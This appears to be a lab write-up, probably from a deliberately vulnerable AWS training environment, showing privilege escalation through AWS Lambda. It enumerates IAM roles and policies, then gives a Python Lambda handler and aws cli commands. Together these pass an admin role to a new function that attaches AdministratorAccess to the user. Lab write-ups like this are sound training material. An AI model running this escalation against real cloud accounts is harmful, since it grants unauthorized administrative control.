----------------

### Lambda Privesc

-----------------

- AWS Lambda is a compute service that runs code without the need to manage servers.
- Enumerating roles-:

```bash
aws iam list-role --profile <iq> | jq
```
<img width="1054" height="900" alt="image" src="https://github.com/user-attachments/assets/cb434025-8a59-4e9a-9077-662da0edc215" />

- Enumerating `LambdaManager` shows that the role has full access over lamda:

```bash
aws iam get-policy-version --policy-arn arn:aws:iam::865614241237:policy/cg-lambdaManager-policy-cgid1n6f5si8o5  --version-id v1 --profile lambda_secrets | jq 
```
<img width="1771" height="471" alt="image" src="https://github.com/user-attachments/assets/940a503a-61f1-48dd-91a7-0c96a6c8c129" />

- Enumerating `debug role` shows we have admin access-:

<img width="1527" height="391" alt="image" src="https://github.com/user-attachments/assets/a0d57505-b996-4be4-8955-8dc4ebaeaa6e" />

- Only `LambdaManager` can be assumed-:

<img width="1908" height="390" alt="image" src="https://github.com/user-attachments/assets/6fa87e8e-ebf0-4671-ae50-e80bf22881d9" />

------------------

### Privilege Escalation with Lambda

------------------

- Fixing issue `'Namespace' object has no attribute 'cli_binary_format'`-:

```bash
pip install awscli
```

- Adding a new profile to `~/.aws/credentials`-: 

```bash
[temp-profile]
aws_access_key_id = ASIAxxxxxxxxxxxxxxxx
aws_secret_access_key = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
aws_session_token = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

- Lambda to escalate privilege-:

```python3
import boto3
import json

def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(UserName='chris-cgid1n6f5si8o5',PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
    return {'statusCode': 200, 'body': json.dumps(response)}
```
- Zip the file-:

```bash
zip -r solve.zip solve.py
```
- Creating the function with aws cli-:

>A user with the iam:PassRole, lambda:CreateFunction, and lambda:InvokeFunction permissions can escalate privileges by passing an existing IAM role to a new Lambda function that includes code to import the relevant AWS library to their programming language of choice, then using it perform actions of their choice. The code could then be run by invoking the function through the AWS API.

```bash
aws lambda create-function --function-name unknown_lambda --runtime python3.11 --role arn:aws:iam::865614241237:role/cg-debug-role-<cgid>  --handler solve.lambda_handler --zip-file fileb://solve.zip --region us-east-1
```

<img width="1918" height="484" alt="image" src="https://github.com/user-attachments/assets/171adbc3-2b75-4c0e-b0ab-11ee14690044" />

- Invoking it-:

```bash
aws lambda invoke --function-name unknown_lambda output.txt --region us-east-1
```

- Confirming it-:

```bash
aws iam list-attached-user-policies --user-name chris-<cgid> --profile lambda_secrets | jq 
```
<img width="1166" height="304" alt="image" src="https://github.com/user-attachments/assets/d864f7c1-c4e6-4aab-b035-daefe243590c" />


-------------------
